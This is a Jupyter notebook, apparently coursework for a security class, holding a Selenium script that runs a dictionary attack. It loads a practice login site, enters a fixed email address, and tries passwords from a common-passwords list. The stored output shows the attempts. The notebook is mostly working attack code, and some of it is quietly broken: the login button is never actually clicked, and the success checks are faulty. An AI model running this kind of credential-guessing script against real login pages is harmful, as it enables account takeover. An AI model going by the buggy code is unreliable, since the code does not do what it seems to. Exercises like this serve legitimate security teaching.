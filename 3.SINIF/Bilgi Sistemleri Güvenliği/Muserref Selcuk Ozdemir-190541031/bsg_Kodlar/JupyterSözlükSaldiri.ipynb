{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "import time\n",
    "from selenium.webdriver.chrome.options import Options\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.common.exceptions import NoSuchElementException\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "username: s_05_60@hotmail.com\n",
      "Sifre: password\n",
      "\n",
      "username: s_05_60@hotmail.com\n",
      "Sifre: password\n",
      "\n",
      "username: s_05_60@hotmail.com\n",
      "Sifre: 12345678\n",
      "\n",
      "username: s_05_60@hotmail.com\n",
      "Sifre: qwerty\n",
      "\n",
      "username: s_05_60@hotmail.com\n",
      "Sifre: 123456\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import http\n",
    "\n",
    "\n",
    "def createSession():\n",
    "    chrome_options = Options()\n",
    "    chrome_options.add_experimental_option(\"detach\", True)\n",
    "\n",
    "    \n",
    "    driver = webdriver.Chrome(options=chrome_options)\n",
    "    driver.maximize_window()\n",
    "    driver.get(\"https://bruteforce-8is0.onrender.com/\")\n",
    "    return driver\n",
    "\n",
    "def check_exists_by_xpath(xpath):\n",
    "    try:\n",
    "        driver.find_element(by=By.XPATH,value=xpath)\n",
    "    except NoSuchElementException:\n",
    "        return False\n",
    "    return True\n",
    "\n",
    "def check_link(link):\n",
    "    if http.url == 'https://bruteforce-8is0.onrender.com/verification':\n",
    "        return True\n",
    "    else:\n",
    "        False\n",
    "    \n",
    "\n",
    "\n",
    "\n",
    "\n",
    "driver = createSession()\n",
    "\n",
    "def loginUser(password):\n",
    "    eposta = driver.find_element(by=By.XPATH,value=\"//*[@id=':r0:']\")\n",
    "    eposta.clear()\n",
    "    print(\"username: s_05_60@hotmail.com\")\n",
    "    eposta.send_keys(\"s_05_60@hotmail.com\")\n",
    "    sifre = driver.find_element(By.XPATH,\"//*[@id=':r1:']\")\n",
    "    sifre.clear()\n",
    "    print(\"Sifre: \"+password)\n",
    "    sifre.send_keys(password)\n",
    "    \n",
    "    buton = driver.find_element(By.XPATH,\"//*[@id='root']/main/div/form/div/button\")\n",
    "    buton.click\n",
    "    time.sleep(4)\n",
    "    \n",
    "    \n",
    "    if(check_exists_by_xpath(\"//*[@id='root']/main/div/div/div/div[2]\")):\n",
    "        driver.refresh()\n",
    "        return 0\n",
    "    else:\n",
    "        driver.close()\n",
    "        return 1\n",
    "    \n",
    "\n",
    "dosya = open(\"common_passwords.txt\",\"r\")\n",
    "sifreler_liste = dosya.readlines()\n",
    "for sifrem in sifreler_liste:\n",
    "    kontrol = loginUser(sifrem)\n",
    "    if kontrol==True:\n",
    "        break\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "# driver.execute_script(\"(arguments[0].value ='123456')\", sifre)\n",
    "\n",
    "# for sifrem in sifreler_liste:\n",
    "    \n",
    "#     sifre.send_keys(sifrem)\n",
    "#     buton.click()\n",
    "#     time.sleep(2)\n",
    "#     driver.execute_script(\"arguments[0].value=''; \",sifre)\n",
    "    \n",
    "\n",
    "\n",
    "\n",
    "    \n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "a9ce8d1bd4cef32f29373bcb59c6a6d376d05724fa6dbea12cabade3e8f60e84"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
